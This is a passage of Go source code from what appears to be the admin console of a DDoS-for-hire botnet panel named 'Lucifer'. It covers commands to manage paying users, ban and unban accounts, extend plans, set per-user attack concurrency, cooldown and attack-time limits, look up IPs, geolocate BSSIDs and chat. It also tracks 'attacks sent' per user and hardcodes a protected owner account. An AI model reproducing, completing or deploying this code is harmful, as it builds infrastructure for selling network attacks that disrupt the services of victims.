				fmt.Fprintln(this.conn, "\r")

			}
			continue

		case "users":

			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			table := simpletable.New()

			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignLeft, Text: "\033[0m#\033[0m"},
					{Align: simpletable.AlignLeft, Text: "\033[97mUsername\033[0m"},
					{Align: simpletable.AlignLeft, Text: "\033[97mAtks\033[0m"},
					{Align: simpletable.AlignLeft, Text: "\033[97mCons/Ipcd\033[0m"},
					{Align: simpletable.AlignLeft, Text: "\033[97mHtime/BPtime\033[0m"},
					{Align: simpletable.AlignLeft, Text: "\033[97mExpiry\033[0m"},
					{Align: simpletable.AlignLeft, Text: "\033[97mADM/MOD\033[0m"},
				},
			}

			users, err := database.GetUsers()
			if err != nil {
				fmt.Fprintln(this.conn, "\033[91m%s\033[0m\r\n", err)
				fmt.Fprintln(this.conn, "\033[91mError\033[0m\r\n")
				continue
			}

			var list []User
			list = users

			fmt.Fprint(this.conn, "\033c")
			for i, user := range list {
				if user.username == "vmfe" || user.username == "VMFE" {
					user.username = "🏅vmfe"
				}
				if user.username == "🏅vmfe" || user.username == "🏅VMFE" {
					userInfo.username = "vmfe"

				}
				r := []*simpletable.Cell{
					{Align: simpletable.AlignLeft, Text: fmt.Sprint(user.ID)},
					{Align: simpletable.AlignLeft, Text: user.username},
					{Align: simpletable.AlignLeft, Text: strconv.Itoa(database.MySent(user.username))},
					{Align: simpletable.AlignLeft, Text: fmt.Sprintf("\033[0m%d\033[0m | \033[0m%d\033[0m", user.concurrents, user.cooldown)},
					{Align: simpletable.AlignLeft, Text: fmt.Sprintf("\033[0m%s\033[0m | \033[0m%s\033[0m", strconv.Itoa(user.hometime), strconv.Itoa(user.bypasstime))},
					{Align: simpletable.AlignLeft, Text: fmt.Sprintf("\033[0m%.2f\033[0m", time.Duration(time.Until(time.Unix(user.expiry, 0))).Hours()/24)},
					{Align: simpletable.AlignLeft, Text: fmt.Sprintf("\033[0m%s\033[0m \033[0m%s\033[0m", formatAdminBool(user.admin), formatSellerBool(user.seller))},
				}

				table.Body.Cells = append(table.Body.Cells, r)
				if i%18 == 0 && i != 0 {
					table.SetStyle(simpletable.StyleUnicode)
					fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
					fmt.Fprintln(this.conn, "\033[36;0H\033[107;30;140mPress Any Key To Continue                                          v1.81.1.7427 \033[0m\033[1A")

					table.Body.Cells = make([][]*simpletable.Cell, 0)

					this.conn.Read(make([]byte, 10))
					fmt.Fprint(this.conn, "\033c")
				}
			}

			if len(table.Body.Cells) > 0 {
				fmt.Fprintf(this.conn, "\033c")
				table.SetStyle(simpletable.StyleUnicode)
				fmt.Fprint(this.conn, "")
				fmt.Fprintln(this.conn, strings.ReplaceAll(table.String(), "\n", "\r\n"))
				fmt.Fprintln(this.conn, "\r")

			}
			continue

		case "ban":

			if userInfo.seller == true {
				goto skipadminauth2
			}
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}
		skipadminauth2:

			if len(args) != 3 {
				this.conn.Write([]byte("\033[96mban \033[0m<\033[96musername\033[0m> \033[0m<\033[96mdays\033[0m>\r\n"))
				continue
			}
			banblacklist := []string{
				"vmfe",
			}
			if args[1] == username {
				this.conn.Write([]byte(fmt.Sprintf("\033[0;91mYou can not ban your self!\033[0;97m\r\n")))
				continue
			}
			for i := range banblacklist {
				if strings.ToLower(args[1]) == banblacklist[i] {
					this.conn.Write([]byte(fmt.Sprintf("\033[0;91mThis user is blacklisted!\033[0;97m\r\n")))
					this.conn.Write([]byte(fmt.Sprintf("\033[4;31mEnding session.\033[0;97m\r\n")))
					time.Sleep(11111 * time.Millisecond)
					return
				}
				continue
			}
			days, err := strconv.Atoi(args[2])
			if err != nil {
				this.conn.Write([]byte("\033[0;91mMust Be An Integer!\033[0;97m\r\n"))
				continue
			}

			if database.UserTempBan(args[1], time.Now().Add(time.Duration(days)*(time.Hour*24)).Unix()) == false {
				this.conn.Write([]byte("\033[0;91mFailed To Ban User!\033[0;97m\r\n"))
				continue
			}
			this.conn.Write([]byte("\033[0;92mBanned \033[0m[ \033[0;97m" + args[1] + "\033[0m ] \033[0;92mSuccesfully\033[0;97m\r\n"))
			continue

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "unban":

			if userInfo.seller == true {
				goto skipadminauth93
			}
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}
		skipadminauth93:

			if len(args) < 2 {
				this.conn.Write([]byte("\033[96munban \033[0m<\033[96musername\033[0m>\r\n"))
				continue
			}

			if database.UserTempBan(args[1], time.Now().Add(time.Duration(0)*(time.Hour*24)).Unix()) == false {
				this.conn.Write([]byte("\033[91mFailed To Unban User!\033[0;97m\r\n"))
				continue
			}

			this.conn.Write([]byte("\033[0;92mUser Unbanned!\033[0;97m\r\n"))
			continue

		case "online":

			table := simpletable.New()

			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\033[0;97m#\033[0m"},
					{Align: simpletable.AlignCenter, Text: "[38;2;44;191;255mU[0m[38;2;55;194;255ms[0m[38;2;65;197;255me[0m[38;2;76;201;255mr[0m[38;2;86;204;255mn[0m[38;2;97;207;255ma[0m[38;2;107;210;255mm[0m[38;2;118;213;255me[0m"},
					{Align: simpletable.AlignCenter, Text: "[38;2;44;191;255mC[0m[38;2;55;194;255mr[0m[38;2;65;197;255me[0m[38;2;76;201;255ma[0m[38;2;86;204;255mt[0m[38;2;97;207;255me[0m[38;2;107;210;255md[0m\033[0m/[38;2;223;245;255mI[0m[38;2;234;249;255md[0m[38;2;244;252;255ml[0m[38;2;255;255;255me[0m"},
					{Align: simpletable.AlignCenter, Text: "\033[0;92mAdmin\033[0m/\033[0;93mMod\033[0m/\033[38;2;99;254;244mPrem\033[0m"},
				},
			}

			sessionMutex.Lock()
			//fmt.Fprint(this.conn, "\033c") // <- [Clears Screen]
			i := 0
			for _, s := range sessions {
				r := []*simpletable.Cell{
					{Align: simpletable.AlignLeft, Text: fmt.Sprint(i + 1)},
					{Align: simpletable.AlignLeft, Text: fmt.Sprintf("\033[0;97m%s\033[0m", censorString(s.Username, "*"))},
					{Text: fmt.Sprintf("\033[93m%.2f\033[0m | \033[93m%.2f\033[0m\033[0m", time.Since(s.Created).Minutes(), time.Since(s.LastCommand).Minutes())},
					{Align: simpletable.AlignLeft, Text: fmt.Sprintf("\033[0;97m%s\033[0m  |  \033[0;97m%s  |  \033[0;97m%s\033[0m", formatAdminBool(database.CheckSessionAdmin(s.Username)), format2faBool(s.seller), formatPremiumBool(s.premium))},
				}
				table.Body.Cells = append(table.Body.Cells, r)
				i++
			}
			sessionMutex.Unlock()

			table.SetStyle(simpletable.StyleUnicode)
			fmt.Fprint(this.conn, strings.Replace("\033[37m"+table.String(), "\n", "\r\n", -1))
			fmt.Fprint(this.conn, "\r\n")
			continue

		case "sessions":
			if userInfo.seller == true {
				goto skipadminauth5
			}
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}
		skipadminauth5:
			table := simpletable.New()

			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\033[0;97m#\033[0m"},
					{Align: simpletable.AlignCenter, Text: "\033[0;97mUsername\033[0m"},
					{Align: simpletable.AlignCenter, Text: "\033[0;97mIP\033[0m"},
					{Align: simpletable.AlignCenter, Text: "\033[0;97mCreated/\033[0;97mIdle\033[0m\033[0m"},
					{Align: simpletable.AlignCenter, Text: "\033[0;97mAdmin/\033[0;97mMod\033[0m\033[0m"},
				},
			}

			sessionMutex.Lock()
			//fmt.Fprint(this.conn, "\033c") // <- [Clears Screen]
			i := 0
			for _, s := range sessions {
				mfa := (len(database.CheckSessionMFA(s.Username)) > 1)
				ip, _, err := net.SplitHostPort(fmt.Sprint(s.Conn.RemoteAddr()))
				if err != nil {
					ip = fmt.Sprint(s.Conn.RemoteAddr())
				}
				r := []*simpletable.Cell{
					{Align: simpletable.AlignLeft, Text: fmt.Sprint(i + 1)},
					{Align: simpletable.AlignLeft, Text: s.Username},
					{Align: simpletable.AlignLeft, Text: ip},
					{Text: fmt.Sprintf("\033[93m%.2f\033[0m | \033[93m%.2f\033[0m\033[0m", time.Since(s.Created).Minutes(), time.Since(s.LastCommand).Minutes())},
					{Align: simpletable.AlignLeft, Text: fmt.Sprintf("\033[0;97m%s\033[0m \033[0;97m%s\033[0m", formatAdminBool(database.CheckSessionAdmin(s.Username)), format2faBool(mfa))},
				}
				table.Body.Cells = append(table.Body.Cells, r)
				i++
			}
			sessionMutex.Unlock()

			table.SetStyle(simpletable.StyleUnicode)
			fmt.Fprint(this.conn, strings.Replace("\033[37m"+table.String(), "\n", "\r\n", -1))
			fmt.Fprint(this.conn, "\r\n")
			continue

		case "chat":

			fmt.Fprintf(this.conn, "\033[0;97mType '\033[0;91m.EXIT\033[0;97m' To Leave The Chat!\033[0m\r\n")

			sessionMutex.Lock()
			for _, s := range sessions {
				if s.Chat == true {
					fmt.Fprintf(s.Conn, "\r\033[0;97m%s has \033[0;32mjoined\033[0;97m the chat!\033[0m\r\n", username)
					fmt.Fprintf(s.Conn, "\r\033[0;97m>\033[0;96m ")
				}
			}
			sessionMutex.Unlock()
			session.Chat = true

			for {
				fmt.Fprint(this.conn, "\033[0;97m>\033[0;96m ")
				msg, err := this.ReadLine(false, false)
				if err != nil {
					return
				}

				if msg == ".EXIT" {
					sessionMutex.Lock()
					session.Chat = false
					for _, s := range sessions {
						if s.Chat == true {
							fmt.Fprintf(s.Conn, "\033[0;97m\r%s has \033[0;91mleft\033[0;97m The Chat!\033[0;97m\r\n", username)
							fmt.Fprintf(s.Conn, "\r\033[0;97m>\033[0;96m ")
						}
					}
					session.Chat = false
					sessionMutex.Unlock()
					break
				}

				sessionMutex.Lock()
				for _, s := range sessions {
					if s.Chat == true && s.Username != username {
						fmt.Fprintf(s.Conn, "\r\033[0;93m%s\033[0;0m> %s\r\n", username, msg)
						fmt.Fprintf(s.Conn, "\033[1K\r\033[0;97m>\033[0;96m ")
					}
				}
				sessionMutex.Unlock()

			}
			continue

		case "setdays":

			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}

			if len(args) == 1 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: \033[0msetdays allplans \033[97m(\033[0mDays\033[97m)\033[0m\r")
				continue
			}

			switch args[1] {
			case "allplans":

				if len(args) != 3 {
					fmt.Fprintln(this.conn, "\033[97mSyntax: \033[0msetdays allplans \033[97m(\033[0mDays\033[97m)\033[0m\r")
					continue
				}

				days, err := strconv.Atoi(args[2])
				if err != nil {
					fmt.Fprintln(this.conn, "\033[91mMust be an integer.\033[0m\r")
					continue
				}

				this.conn.Write([]byte("\033[97mAre You Sure? (\033[00;92mY\033[97m/\033[91mn\033[97m):\033[0m "))
				confirm, err := this.ReadLine(false, false)
				if err != nil {
					this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err)))
				}
				if confirm != "y" {
					continue
				}

				_, err = database.db.Exec("UPDATE `users` SET `expiry` = `expiry` + ?", days*86400)
				if err != nil {
					fmt.Println(err)
					fmt.Fprintln(this.conn, "\033[91merror.\033[0m\r")
					continue
				}

				fmt.Println("\033[92mAdded ", days, " To All Plans\033[0m")
				fmt.Fprintln(this.conn, "\033[97mAll plans given extra "+fmt.Sprint(days)+" days\033[0m\r")

				break
			default:
				fmt.Fprintln(this.conn, "\033[91merror.\033[0m\r")
			}
			continue
		}

		if args[0] == "setcons" && len(args) < 2 {
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}
			this.conn.Write([]byte("\033[0mExample: \033[96msetcons \033[0m<\033[96mconcurrents\033[0m>\r\n"))
			continue
		}
		if args[0] == "setcons" && len(args) > 1 {
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}
			days := args[1]
			cons, err := strconv.Atoi(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "Concurrents change request must be an int\r\n")
				return
			}
			this.conn.Write([]byte("\033[97mAre You Sure? (\033[00;92mY\033[97m/\033[91mn\033[97m):\033[0m "))
			confirm, err := this.ReadLine(false, false)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err)))
			}
			if confirm != "y" {
				continue
			}
			if database.setalluserscons(cons) {
				this.conn.Write([]byte("\033[96mSuccessfully added \033[0m" + days + "\033[96m cons to all users\033[0m.\r\n"))
			}
			continue
		}

		if args[0] == "setcooldown" && len(args) < 2 {
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}
			this.conn.Write([]byte("\033[0mExample: \033[96msetcooldown \033[0m<\033[96mcooldown\033[0m>\r\n"))
			continue
		}
		if args[0] == "setcooldown" && len(args) > 1 {
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}
			days := args[1]
			cons, err := strconv.Atoi(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "Cooldown change request must be an int\r\n")
				return
			}
			this.conn.Write([]byte("\033[97mAre You Sure? (\033[00;92mY\033[97m/\033[91mn\033[97m):\033[0m "))
			confirm, err := this.ReadLine(false, false)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err)))
			}
			if confirm != "y" {
				continue
			}
			if database.setalluserscooldown(cons) {
				this.conn.Write([]byte("\033[96mSuccessfully added \033[0m" + days + "\033[96m to all users\033[0m.\r\n"))
			}
			continue
		}

		if args[0] == "sethometime" && len(args) < 2 {
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}
			this.conn.Write([]byte("\033[0mExample: \033[96msethometime \033[0m<\033[96mAttackTime\033[0m>\r\n"))
			continue
		}
		if args[0] == "sethometime" && len(args) > 1 {
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}
			days := args[1]
			cons, err := strconv.Atoi(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "Hometime change request must be an int\r\n")
				continue
			}
			this.conn.Write([]byte("\033[97mAre You Sure? (\033[00;92mY\033[97m/\033[91mn\033[97m):\033[0m "))
			confirm, err := this.ReadLine(false, false)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err)))
			}
			if confirm != "y" {
				continue
			}
			if database.setallusershometime(cons) {
				this.conn.Write([]byte("\033[96mSuccessfully added \033[0m" + days + "\033[96m to all users\033[0m.\r\n"))
			}
			continue
		}

		//if args[0] == "dm" && len(args) < 3 {
		//	this.conn.Write([]byte("\033[0mExample: \033[96mdm \033[0m<\033[96mUsername\033[0m>\r\n"))
		//	continue
		//}

		//if args[0] == "dm" && len(args) > 2 {

		//	if len(args[2:]) > 80 {
		//		this.conn.Write([]byte(fmt.Sprintf("\033[0m[\033[91mDM\033[0m]-\033[0m[\033[0mUnsuccesfull\033[0m]\r\n")))
		//		fmt.Fprintf(this.conn, "\033[91mMax Characters Is 80\033[0m\r\n")
		//		continue
		//	}

		//	i := 1
		//	userv2 := args[1]
		//	var username2 string
		//	username2 = username
		//	sessionMutex.Lock()
		//	for _, s := range sessions {
		//		if userv2 != s.Username {
		//			this.conn.Write([]byte(fmt.Sprintf("Session Not found\r\n")))
		//			//if s.Bhat == true {
		//			if s.Username == userv2 {
		//				fmt.Fprintf(s.Conn, "\r\n\033[97mMessage from [\033[37m%s\033[97m]: \033[0m"+strings.Join(args[2:], " ")+" \r\n\033[97m", username2)
		//				jsonprompt, err := ioutil.ReadFile("json/prompt.json")
		//				if err != nil {
		//					this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err)))
		//				}
		//				stringjsonfile := string(jsonprompt)
		//				var jsonprompt2 = (gjson.Get(stringjsonfile, "prompt")).String()
		//				jsonprompt3 := strings.Replace(jsonprompt2, "<<$username>>", s.Username, -1)
		//				fmt.Fprintf(s.Conn, ""+jsonprompt3+"")
		//				continue
		//			}
		//			sessionMutex.Unlock()
		//			continue
		//		}

		//		_, err = database.GetUser(args[1])
		//		if err != nil {
		//			this.conn.Write([]byte(fmt.Sprintf("\033[0m[\033[91mDM\033[0m]-\033[0m[\033[0mUnsuccesfull\033[0m]\r\n")))
		//		} else {
		//			i++
		//			spinBuf := []string{"15", "14", "13", "12", "11", "10", "9", "8", "7", "6", "5", "4", "3", "2", "1", "0"}
		//			for _, number := range spinBuf {
		//				this.conn.Write([]byte(fmt.Sprintf("\r\033[0mCooldown %s second(s) left.[?25l  \r\033[0m", number)))
		//				time.Sleep(time.Duration(1000) * time.Millisecond)
		//				continue
		//			}
		//		}
		//		this.conn.Write([]byte("\r\033[0mCooldown Finished[?25h                  \033[0m"))
		//		this.conn.Write([]byte("\033[0m\r\n"))
		//		this.conn.Write([]byte("\033[0m[\033[92mDM\033[0m]-\033[0m[\033[0mSuccesfully Sent\033[0m]\r\n"))
		//		continue
		//	}
		//	sessionMutex.Unlock()
		//	continue
		//}

		if args[0] == "expiry" && len(args) < 2 {
			if userInfo.seller == true {
				goto skipadminauth90
			}
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}
		skipadminauth90:
			this.conn.Write([]byte("\033[0mExample: \033[96mexpiry \033[0m<\033[96musername\033[0m> <\033[96mdays\033[0m>\r\n"))
			continue
		}
		if args[0] == "expiry" && len(args) > 2 {
			if userInfo.seller == true {
				goto skipadminauth11
			}
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}
		skipadminauth11:
			edituser := args[1]
			days := args[2]
			editplanExpire, err := strconv.Atoi(days)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mInvalid Expiry!\033[00;0m\r")))
				continue
			}
			if database.EditDays(edituser, editplanExpire) {
				this.conn.Write([]byte("\033[96mSuccessfully added \033[0m" + days + "\033[96m to \033[0m" + edituser + "\033[96m plan\033[0m.\r\n"))
			}
			continue
		}

		command := strings.Split(cmd, " ")
		switch strings.ToLower(command[0]) {
		case "mfaon":

			if len(userInfo.mfasecret) < 10 {
				fmt.Fprint(this.conn, "\033[0mDo You Want 2FA Activated (\033[00;92mY\033[0;97m/\033[91mn\033[0m)\033[0;97m: ")
				confirm, err := this.ReadLine(false, false)
				if err != nil {
					return
				}

				confirm = strings.ToLower(confirm)

				if confirm != "Y" && confirm != "y" {
					fmt.Fprintln(this.conn, "\033[91mAborted!\033[0;97m\r")
					continue
				}

				fmt.Fprint(this.conn, "\033[91mFULL SCREEN YOUR PUTTY SCREEN!\033[0;97m\r\n")
				time.Sleep(5000 * time.Millisecond)
				fmt.Fprint(this.conn, "\033c")
				time.Sleep(100 * time.Millisecond)

				secret := GenTOTPSecret()

				totp := gotp.NewDefaultTOTP(secret)

				qr := New1()
				qrcode := qr.Get("otpauth://totp/" + url.QueryEscape("Lucifer") + ":" + url.QueryEscape(username) + "?secret=" + secret + "&issuer=" + url.QueryEscape("Lucifer") + "&digits=6&period=30").Sprint()
				fmt.Fprintln(this.conn, strings.ReplaceAll(qrcode, "\n", "\r\n"))

				fmt.Fprintln(this.conn, "You Can Scan QR Or Type This Code! APP NAME: Twilio Authy\033[0;97m\r")
				fmt.Fprintln(this.conn, "MFA Secret> "+secret+"\r")

				fmt.Fprint(this.conn, "\033[96mCode\033[0;97m: ")
				code, err := this.ReadLine(false, false)
				if err != nil {
					return
				}

				if totp.Now() != code {
					fmt.Fprintln(this.conn, "\033[91mInvalid Code!\033[0;97m\r")
					continue
				}

				if database.UserToggleMfa(username, secret) == false {
					fmt.Fprintln(this.conn, "\033[91mFailed To Enable MFA!\033[0;97m\r")
					continue
				}

				userInfo.mfasecret = secret

				fmt.Fprintln(this.conn, "\033[96mYou Now Have MFA!\033[0;97m\r")
				continue
			}

			fmt.Fprintln(this.conn, "\033[96mYou Alr Have MFA!\033[0;97m\r")
			continue

		case "echo":
			if len(args) < 2 {
				this.conn.Write([]byte(fmt.Sprintf("\033[97mSyntax: \033[0mecho \033[96m<\033[97mmessage\033[96m> \033[0m\r\n")))
				continue
			}
			this.conn.Write([]byte("\033[97m->\033[0m \033[4;1m" + strings.Join(args[1:], " ") + "\033[0m\r\n"))
			continue

		case "mfaoff":

			if len(userInfo.mfasecret) > 1 {
				fmt.Fprint(this.conn, "\033[96mMFA Code: ")
				code, err := this.ReadLine(false, false)
				if err != nil {
					return
				}

				totp := gotp.NewDefaultTOTP(userInfo.mfasecret)

				if totp.Now() != code {
					fmt.Fprintln(this.conn, "\033[91mInvalid Code!\033[0m\r")
					continue
				}

				if database.UserToggleMfa(username, "") == false {
					fmt.Fprintln(this.conn, "\033[91mFailed To Remove MFA!\033[0m\r")
					continue
				}

				userInfo.mfasecret = ""
				fmt.Fprintln(this.conn, "\033[32mMfa Removed.\033[0m\r")
				continue
			}

			fmt.Fprintln(this.conn, "\033[91mYou Dont Have MFA!\033[0m\r")

			continue
		}

		// Blacklist any user IP Address

		if args[0] == "sumhash" || args[0] == "SUMHASH" {
			if len(args) < 3 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: \033[0msumhash \033[96m<\033[0malgorithm\033[96m>\033[0m \033[96m<\033[0mword\033[96m>\033[0m\r")
				continue
			}
			hashtype := args[1]
			word := args[2]
			cmd := exec.Command("./sumhash", hashtype, word)
			stdout, err := cmd.StdoutPipe()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r", string(err.Error()))))
				continue
			}

			err = cmd.Start()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r", string(err.Error()))))
				continue
			}

			buffer := bufio.NewReader(stdout)
			for {

				line, _, err := buffer.ReadLine()
				this.conn.Write([]byte("\033[0m\r\n"))
				this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(line))))

				if err == io.EOF {
					break
				}
			}
			continue
		}

		if args[0] == "geobssid" || args[0] == "GEOBSSID" {
			if len(args) < 2 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: \033[0mgeobssid \033[96m<\033[0mchars\033[96m>\033[0m\r")
				continue
			}
			geobssidchars := args[1]
			cmd := exec.Command("./geobssid", geobssidchars)
			stdout, err := cmd.StdoutPipe()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r", string(err.Error()))))
				continue
			}

			err = cmd.Start()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r", string(err.Error()))))
				continue
			}

			buffer := bufio.NewReader(stdout)
			for {

				line, _, err := buffer.ReadLine()
				this.conn.Write([]byte(fmt.Sprintf("\r\n\033[0m%s\033[0m\r\n", string(line))))

				if err == io.EOF {
					break
				}
			}
			continue
		}

		if args[0] == "viewuser" || args[0] == "VIEWUSER" {
			if userInfo.seller == true {
				goto skipadminauth7
			}
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}
		skipadminauth7:
			if len(args) < 2 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: viewuser (username)\033[0m\r")
				continue
			}
			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "\033[91mInvalid User!\033[0m\r")
				continue
			}
			var premium string
			var home string
			var vip string
			var admin string
			var seller string
			tempBanbool := (user.ban > time.Now().Unix())
			if user.premium == true {
				premium = "\033[92mtrue\033[0m"
			} else {
				premium = "\033[91mfalse\033[0m"
			}
			if user.home == true {
				home = "\033[92mtrue\033[0m"
			} else {
				home = "\033[91mfalse\033[0m"
			}
			if user.vip == true {
				vip = "\033[92mtrue\033[0m"
			} else {
				vip = "\033[91mfalse\033[0m"
			}
			if user.admin == true {
				admin = "\033[92mtrue\033[0m"
			} else {
				admin = "\033[91mfalse\033[0m"
			}
			if user.seller == true {
				seller = "\033[92mtrue\033[0m"
			} else {
				seller = "\033[91mfalse\033[0m"
			}
			this.conn.Write([]byte(fmt.Sprintf("\033[0mExpiry: %.2f\033[0m\r\n", time.Duration(time.Until(time.Unix(user.expiry, 0))).Hours()/24)))
			this.conn.Write([]byte(fmt.Sprintf("\033[0mBanned: %s\033[0m\r\n", formatBool(tempBanbool))))
			this.conn.Write([]byte(fmt.Sprintf("\033[0mConcurrents: %d\033[0m\r\n", user.concurrents)))
			this.conn.Write([]byte(fmt.Sprintf("\033[0mHometime: %d\033[0m\r\n", user.hometime)))
			this.conn.Write([]byte(fmt.Sprintf("\033[0mIPCD: %d\033[0m\r\n", user.cooldown)))
			this.conn.Write([]byte(fmt.Sprintf("\033[0mHome: %s\033[0m\r\n", string(home))))
			this.conn.Write([]byte(fmt.Sprintf("\033[0mVip: %s\033[0m\r\n", string(vip))))
			this.conn.Write([]byte(fmt.Sprintf("\033[0mPremium: %s\033[0m\r\n", string(premium))))
			this.conn.Write([]byte(fmt.Sprintf("\033[0mAdmin: %s\033[0m\r\n", string(admin))))
			this.conn.Write([]byte(fmt.Sprintf("\033[0mSeller: %s\033[0m\r\n", string(seller))))
			this.conn.Write([]byte(fmt.Sprintf("\033[0mAttacks Sent: %s\033[0m\r\n", strconv.Itoa(database.MySent(user.username)))))
			continue
		}

		if args[0] == "iplookup" || args[0] == "IPLOOKUP" {
			if len(args) < 2 {
				this.conn.Write([]byte("\033[97msyntax: \033[0miplookup \033[36m<\033[0mIPv4\033[36m>\033[0m\r\n"))
				continue
			}
			ip := args[1]
			if ip == "" {
				this.conn.Write([]byte("\033[91mError\033[97m:\033[0m failed to lookup `" + ip + "`\r\n"))
				continue
			} else if ip == " " {
				this.conn.Write([]byte("\033[91mError\033[97m:\033[0m failed to lookup `" + ip + "`\r\n"))
				continue
			} else {
				Lookup(ip, this)
				continue
			}
		}

		if args[0] == "addcons" || args[0] == "ADDCONS" {
			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}
			if len(args) < 3 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: addcons (username) (concurrents)\033[0m\r")
				continue
			}

			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "\033[91mInvalid User!\033[0m\r")
				continue
			}

			duration, err := strconv.Atoi(args[2])
			if err != nil {
				fmt.Fprintln(this.conn, "Concurrents change request must be an int\r\n")
				return
			}

			if database.addcons(duration, user.username) == false {
				fmt.Fprintln(this.conn, "\033[91mFailed To Add Cons!\033[00;0m\r")
				continue
			}
			f, err := os.OpenFile("logs/acclogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err)
				return
			}

			clog := time.Now()
			newLine := clog.Format("Date: Jan 02 2006") + " | User: " + username + " | Added Concurrents To Users: " + user.username + ""
			_, err = fmt.Fprintln(f, newLine)
			if err != nil {
				fmt.Println(err)
				f.Close()
				return
			}
			err = f.Close()
			if err != nil {
				fmt.Println(err)
				return
			}

			fmt.Fprintln(this.conn, "\033[0mConcurrents Added!\033[00;0m\r")
			continue
		}

		if args[0] == "edithometime" || args[0] == "EDITHOMETIME" {
			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			if len(args) < 3 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: edithometime (username) (time)\033[0m\r")
				continue
			}

			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "\033[91mInvalid User!\033[0m\r")
				continue
			}

			durationcut, err := strconv.Atoi(args[2])
			if err != nil {
				fmt.Fprintln(this.conn, "Hometime change request must be an int\r\n")
				return
			}

			if database.EditHometime(user.username, durationcut) == false {
				fmt.Fprintln(this.conn, "\033[91mFailed To Update Hometime!\033[00;0m\r")
				continue
			}
			f, err := os.OpenFile("logs/acclogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err)
				return
			}

			clog := time.Now()
			newLine := clog.Format("Date: Jan 02 2006") + " | User: " + username + " | Updated Hometime To Users: " + user.username + ""
			_, err = fmt.Fprintln(f, newLine)
			if err != nil {
				fmt.Println(err)
				f.Close()
				return
			}
			err = f.Close()
			if err != nil {
				fmt.Println(err)
				return
			}

			fmt.Fprintln(this.conn, "\033[0mHometime Updated!\033[00;0m\r")
			continue
		}

		if args[0] == "editcooldown" || args[0] == "EDITCOOLDOWN" {
			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			if len(args) < 3 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: editcooldown (username) (time)\033[0m\r")
				continue
			}

			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "\033[91mInvalid User!\033[0m\r")
				continue
			}

			durationcut, err := strconv.Atoi(args[2])
			if err != nil {
				fmt.Fprintln(this.conn, "Cooldown change request must be an int\r\n")
				return
			}

			if database.updatecooldown(user.username, durationcut) == false {
				fmt.Fprintln(this.conn, "\033[91mFailed To Update Cooldown!\033[00;0m\r")
				continue
			}
			f, err := os.OpenFile("logs/acclogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err)
				return
			}

			clog := time.Now()
